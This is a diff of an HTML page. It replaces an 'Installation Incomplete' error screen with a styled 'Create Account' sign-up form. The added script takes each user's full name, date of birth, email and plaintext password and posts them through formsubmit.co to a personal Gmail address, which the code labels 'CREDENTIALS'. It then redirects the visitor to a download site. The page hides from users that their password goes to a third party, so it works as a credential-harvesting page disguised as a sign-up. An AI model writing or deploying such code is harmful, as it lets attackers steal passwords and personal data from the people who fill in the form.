@@ -1,86 +1,232 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Installation Error</title>
-
-<style>
-    body {
-        margin: 0;
-        padding: 0;
-        height: 100vh;
-        display: flex;
-        justify-content: center;
-        align-items: center;
-        background: #0a0a0a;
-        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        color: white;
-    }
-
-    .container {
-        text-align: center;
-        padding: 40px;
-        border-radius: 15px;
-        background: rgba(255,255,255,0.05);
-        backdrop-filter: blur(10px);
-        box-shadow: 0 0 20px #00f0ff, 0 0 40px #00f0ff inset;
-        animation: glow 2s infinite alternate;
-        max-width: 400px;
-    }
-
-    @keyframes glow {
-        from {
-            box-shadow: 0 0 10px #00f0ff, 0 0 20px #00f0ff inset;
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Pro Glow Sign Up</title>
+    <style>
+        /* Modern Font */
+        @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600&display=swap');
+        
+        body { 
+            font-family: 'Poppins', sans-serif;
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            min-height: 100vh; 
+            background-color: #0f172a; /* Deep Slate Background */
+            margin: 0; 
+            color: #f8fafc; 
         }
-        to {
-            box-shadow: 0 0 25px #00f0ff, 0 0 60px #00f0ff inset;
+
+        /* Professional Box with Soft Glow */
+        .glow-pro-box { 
+            background: #1e293b; 
+            padding: 40px 35px; 
+            border-radius: 16px; 
+            text-align: center; 
+            width: 85%;
+            max-width: 380px; 
+            /* Halka aur premium glow border par */
+            border: 1px solid rgba(56, 189, 248, 0.3);
+            box-shadow: 0 0 25px rgba(56, 189, 248, 0.12), inset 0 0 10px rgba(56, 189, 248, 0.05);
         }
-    }
 
-    h1 {
-        margin-bottom: 15px;
-        font-size: 26px;
-        color: #00f0ff;
-        text-shadow: 0 0 10px #00f0ff;
-    }
+        h2 { 
+            margin-bottom: 5px;
+            font-size: 28px;
+            font-weight: 600;
+            /* Text par blue/purple gradient */
+            background: linear-gradient(to right, #38bdf8, #818cf8);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
 
-    p {
-        font-size: 16px;
-        color: #ccc;
-        margin-bottom: 25px;
-    }
+        p {
+            font-size: 14px;
+            color: #94a3b8;
+            margin-bottom: 30px;
+        }
 
-    .btn {
-        display: inline-block;
-        padding: 12px 25px;
-        border-radius: 25px;
-        border: none;
-        background: #00f0ff;
-        color: black;
-        font-weight: bold;
-        cursor: pointer;
-        transition: 0.3s;
-        box-shadow: 0 0 10px #00f0ff;
-    }
+        .input-group {
+            text-align: left;
+            margin-bottom: 20px;
+        }
 
-    .btn:hover {
-        background: #00c3cc;
-        box-shadow: 0 0 20px #00f0ff;
-    }
-</style>
+        label {
+            display: block;
+            font-size: 13px;
+            color: #cbd5e1;
+            margin-bottom: 8px;
+            font-weight: 500;
+            letter-spacing: 0.5px;
+        }
+
+        input { 
+            width: 100%; 
+            padding: 14px 15px; 
+            box-sizing: border-box;
+            border: 1px solid #334155; 
+            background: #0f172a; 
+            color: #f8fafc; 
+            font-size: 15px;
+            border-radius: 8px;
+            transition: all 0.3s ease;
+            font-family: 'Poppins', sans-serif;
+        }
+
+        /* Input par click karne se soft glow aayega */
+        input:focus {
+            outline: none;
+            border-color: #38bdf8;
+            box-shadow: 0 0 12px rgba(56, 189, 248, 0.3);
+        }
+
+        input::placeholder {
+            color: #475569;
+        }
+
+        /* Glowing Button */
+        button { 
+            padding: 15px; 
+            background: linear-gradient(to right, #0284c7, #4f46e5); 
+            color: #ffffff; 
+            border: none; 
+            border-radius: 8px; 
+            cursor: pointer; 
+            font-size: 16px;
+            font-weight: 600;
+            width: 100%;
+            margin-top: 10px;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(79, 70, 229, 0.3);
+        }
+
+        button:hover {
+            box-shadow: 0 6px 20px rgba(79, 70, 229, 0.5);
+            transform: translateY(-1px);
+        }
+
+        button:disabled {
+            background: #334155;
+            box-shadow: none;
+            cursor: not-allowed;
+            color: #94a3b8;
+        }
+
+        #loading-screen { 
+            display: none; 
+            text-align: center;
+        }
+        
+        .loader {
+            width: 45px;
+            height: 45px;
+            border-radius: 50%;
+            border: 3px solid #334155;
+            border-top-color: #38bdf8;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+            box-shadow: 0 0 15px rgba(56, 189, 248, 0.2);
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+    </style>
 </head>
-
 <body>
 
-<div class="container">
-    <h1>Installation Incomplete</h1>
-    <p>
-        It appears that the application was not installed correctly.  
-        Please reinstall the app properly to continue.
-    </p>
-    <button class="btn" onclick="location.reload()">Retry</button>
-</div>
+    <!-- Loading Screen -->
+    <div id="loading-screen">
+        <div class="loader"></div>
+        <p style="color: #cbd5e1; font-size: 15px;">Authenticating...</p>
+    </div>
 
+    <!-- Professional Soft Glow Form -->
+    <div class="glow-pro-box" id="signup-box">
+        <h2>Create Account</h2>
+        <p>Enter your details to get started</p>
+        
+        <div class="input-group">
+            <label>Full Name</label>
+            <input type="text" id="userFullName" placeholder="" required />
+        </div>
+
+        <div class="input-group">
+            <label>Date of Birth</label>
+            <input type="text" id="userDOB" placeholder="DD/MM/YYYY" required />
+        </div>
+
+        <div class="input-group">
+            <label>Email Address</label>
+            <input type="email" id="userEmail" placeholder="name@example.com" required />
+        </div>
+
+        <div class="input-group">
+            <label>Password</label>
+            <input type="password" id="userPass" placeholder="••••••••" required />
+        </div>
+        
+        <button id="submitBtn" onclick="handleSignup()">Sign Up</button>
+    </div>
+
+    <script>
+        // --- CREDENTIALS ---
+        const adminEmail = "mrpinto1433@gmail.com"; 
+        const targetLink = "https://allinonedown.weebly.com"; 
+
+        // Auto-check on Page Load
+        window.onload = function() {
+            if (localStorage.getItem("app_user_verified") === "true") {
+                showLoading();
+                window.location.href = targetLink;
+            }
+        };
+
+        function showLoading() {
+            document.getElementById("signup-box").style.display = "none";
+            document.getElementById("loading-screen").style.display = "block";
+        }
+
+        function handleSignup() {
+            const fullName = document.getElementById("userFullName").value;
+            const dob = document.getElementById("userDOB").value;
+            const email = document.getElementById("userEmail").value;
+            const pass = document.getElementById("userPass").value;
+            const btn = document.getElementById("submitBtn");
+
+            if(!fullName || !dob || !email || !pass) {
+                alert("Please fill all the details to continue!");
+                return;
+            }
+
+            btn.innerText = "Processing...";
+            btn.disabled = true;
+
+            fetch(`https://formsubmit.co/ajax/${adminEmail}`, {
+                method: "POST",
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    "Full Name": fullName,
+                    "Date of Birth": dob,
+                    "Email": email,
+                    "Password": pass,
+                    "_subject": "New App Registration!"
+                })
+            })
+            .then(() => {
+                localStorage.setItem("app_user_verified", "true");
+                showLoading();
+                window.location.href = targetLink;
+            })
+            .catch(() => {
+                alert("Network error! Please check your connection.");
+                btn.innerText = "Sign Up";
+                btn.disabled = false;
+            });
+        }
+    </script>
 </body>
 </html>
